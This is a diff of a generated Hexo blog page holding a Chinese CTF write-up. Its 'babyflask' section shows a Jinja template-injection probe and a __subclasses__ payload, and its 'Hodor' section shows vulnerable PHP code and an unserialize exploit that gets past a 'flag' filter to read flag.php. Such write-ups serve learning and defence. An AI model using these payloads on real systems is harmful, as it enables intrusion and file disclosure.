@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -250,7 +250,7 @@
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
 <h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
 <p>就是了模板注入</p>
-<div class="hljs"><pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="language-xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml">Copy</span></code></pre></div>
 
 <p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
 <div class="hljs"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
@@ -271,20 +271,20 @@
 <h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
 <p>看到WP是大S绕过，涨知识了</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
+Class Source &#123;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
     &#125;
 &#125;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
     <span class="hljs-comment">//echo $str;</span>
-    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
     &#125;
     <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
 &#125;
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
-    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
+    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Source</span>();
     <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;
 
     <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
@@ -292,14 +292,14 @@
 &#125;
 <span class="hljs-variable">$todos</span> = [];
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
-    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">easy_check</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
-        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
-        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
-        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
-            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
+        <span class="hljs-variable">$h</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-variable">$m</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
+            <span class="hljs-variable">$todos</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$m</span>);
         &#125;
     &#125;
 &#125;
@@ -307,20 +307,20 @@
     <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];
 
     <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
-    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
-    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);
+    <span class="hljs-variable">$m</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$todos</span>);
+    <span class="hljs-variable">$h</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$m</span>);
 
-    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
-    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
+    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
     <span class="hljs-keyword">exit</span>;
 &#125;
 <span class="hljs-comment">// flag is in flag.php</span>
 ?Copy</code></pre></div>
 
 <p>exp</p>
-<div class="hljs"><pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
+<div class="hljs"><pre><code class="hljs rust">echo <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
 &#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
-echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
+echo <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
 &#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre></div>
 
 <p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></a></p>
